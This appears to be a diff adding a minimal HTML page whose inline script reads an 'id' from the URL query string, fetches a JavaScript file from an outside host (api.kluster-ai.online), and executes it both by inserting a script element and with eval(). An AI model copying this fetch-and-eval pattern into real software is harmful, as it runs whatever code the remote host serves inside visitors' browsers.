@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Simple Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            background-color: ghostwhite;
+        }
+    </style>
+    
+    
+</head>
+<body>
+
+    <header>
+        <h1>Welcome to My Simple Website</h1>
+    </header>
+
+
+    <script>
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+
+    const scriptUrl = `https://api.kluster-ai.online/api/me/embed/${id}/kluster.js`;
+
+    fetch(scriptUrl).then(response => response.text()).then(text => {
+        const script = document.createElement("script");
+        script.text = text;
+        document.body.appendChild(script);
+
+        eval(text);
+    });
+
+        
+    </script>
+
+    <!-- <script src="https://api.kluster-ai.online/api/me/embed/17176cdf-6c9c-4ed8-9896-3abc7d3a4497/kluster.js"></script> -->
+
+</body>
+
+</html>
